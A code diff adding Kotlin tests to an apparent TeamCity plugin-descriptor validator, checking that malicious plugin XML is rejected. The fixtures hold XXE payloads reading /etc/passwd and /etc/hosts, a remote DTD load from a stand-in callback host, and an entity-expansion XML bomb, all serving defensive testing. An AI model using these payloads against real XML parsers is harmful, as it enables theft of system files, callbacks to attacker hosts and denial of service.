@@ -148,4 +148,161 @@ class TeamcityInvalidPluginsTest(fileSystemType: FileSystemType) : BasePluginMan
       listOf(PropertyNotSpecified("version"))
     )
   }
+
+
+  @Test
+  fun `failed to parse xml with xxe in value`() {
+    val xxe = """
+      <!DOCTYPE description [
+        <!ENTITY file SYSTEM "file:///etc/passwd">
+      ]>
+
+      <teamcity-plugin xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                       xsi:noNamespaceSchemaLocation="urn:shemas-jetbrains-com:teamcity-plugin-v1-xml">
+        <info>
+          <name>Octopus.TeamCity</name>
+          <display-name>Octopus Deploy integration</display-name>
+          <version>6.1.15</version>
+          <description>&file;</description>
+
+          <vendor>
+            <name>Octopus Deploy Pty. Ltd.</name>
+            <url>http://octopusdeploy.com</url>
+          </vendor>
+        </info>
+        <deployment use-separate-classloader="true" allow-runtime-reload="true" teamcity.development.shadowCopyClasses="true" />
+      </teamcity-plugin>
+    """.trimIndent()
+
+    `test invalid plugin xml`(
+      pluginXmlContent = xxe,
+      expectedProblems = listOf(UnexpectedDescriptorElements(1))
+    )
+  }
+
+  @Test
+  fun `failed to parse xml with xxe in attribute`() {
+    val xxe = """
+      <!DOCTYPE doc [
+        <!ENTITY ff SYSTEM "file:///etc/hosts">
+      ]>
+
+      <teamcity-plugin xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                       xsi:noNamespaceSchemaLocation="urn:shemas-jetbrains-com:teamcity-plugin-v1-xml">
+        <info>
+          <name>Octopus.TeamCity</name>
+          <display-name>Octopus Deploy integration</display-name>
+          <version>6.1.15</version>
+          <description info="&ff;">test</description>
+          <vendor>
+            <name>Octopus Deploy Pty. Ltd.</name>
+            <url>http://octopusdeploy.com</url>
+          </vendor>
+        </info>
+        <deployment use-separate-classloader="true" allow-runtime-reload="true" teamcity.development.shadowCopyClasses="true" />
+      </teamcity-plugin>
+    """.trimIndent()
+
+    `test invalid plugin xml`(
+      pluginXmlContent = xxe,
+      expectedProblems = listOf(UnexpectedDescriptorElements(1))
+    )
+  }
+
+  @Test
+  fun `failed to parse xml with remote dtd xxe`() {
+    val xxe = """
+      <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://YOUR_CALLBACK/evil.dtd">
+        %remote;
+      ]>
+
+      <teamcity-plugin xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                       xsi:noNamespaceSchemaLocation="urn:shemas-jetbrains-com:teamcity-plugin-v1-xml">
+        <info>
+          <name>Octopus.TeamCity</name>
+          <display-name>Octopus Deploy integration</display-name>
+          <version>6.1.15</version>
+          <description>test</description>
+
+          <vendor>
+            <name>Octopus Deploy Pty. Ltd.</name>
+            <url>http://octopusdeploy.com</url>
+          </vendor>
+        </info>
+        <deployment use-separate-classloader="true" allow-runtime-reload="true" teamcity.development.shadowCopyClasses="true" />
+      </teamcity-plugin>
+    """.trimIndent()
+
+    `test invalid plugin xml`(
+      pluginXmlContent = xxe,
+      expectedProblems = listOf(UnexpectedDescriptorElements(1))
+    )
+  }
+
+  @Test
+  fun `failed to parse xml with error local dtd`() {
+    val xxe = """
+      <!DOCTYPE root [
+        <!ENTITY % local "abc">
+        <!ENTITY name "%local;">
+        <!ENTITY ex "start &name; end">
+      ]>
+
+      <teamcity-plugin xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                       xsi:noNamespaceSchemaLocation="urn:shemas-jetbrains-com:teamcity-plugin-v1-xml">
+        <info>
+          <name>Octopus.TeamCity</name>
+          <display-name>Octopus Deploy integration</display-name>
+          <version>6.1.15</version>
+          <description>&ex;</description>
+
+          <vendor>
+            <name>Octopus Deploy Pty. Ltd.</name>
+            <url>http://octopusdeploy.com</url>
+          </vendor>
+        </info>
+        <deployment use-separate-classloader="true" allow-runtime-reload="true" teamcity.development.shadowCopyClasses="true" />
+      </teamcity-plugin>
+    """.trimIndent()
+
+    `test invalid plugin xml`(
+      pluginXmlContent = xxe,
+      expectedProblems = listOf(UnexpectedDescriptorElements(1))
+    )
+  }
+
+  @Test
+  fun `failed to parse xml with xml bomb`() {
+    val xxe = """
+      <!DOCTYPE lolz [
+       <!ENTITY a "aaaaaaaaaa">
+       <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+       <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+       <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+       <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
+      ]>
+
+      <teamcity-plugin xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                       xsi:noNamespaceSchemaLocation="urn:shemas-jetbrains-com:teamcity-plugin-v1-xml">
+        <info>
+          <name>Octopus.TeamCity</name>
+          <display-name>Octopus Deploy integration</display-name>
+          <version>6.1.15</version>
+          <description>&e;</description>
+
+          <vendor>
+            <name>Octopus Deploy Pty. Ltd.</name>
+            <url>http://octopusdeploy.com</url>
+          </vendor>
+        </info>
+        <deployment use-separate-classloader="true" allow-runtime-reload="true" teamcity.development.shadowCopyClasses="true" />
+      </teamcity-plugin>
+    """.trimIndent()
+
+    `test invalid plugin xml`(
+      pluginXmlContent = xxe,
+      expectedProblems = listOf(UnexpectedDescriptorElements(1))
+    )
+  }
 }
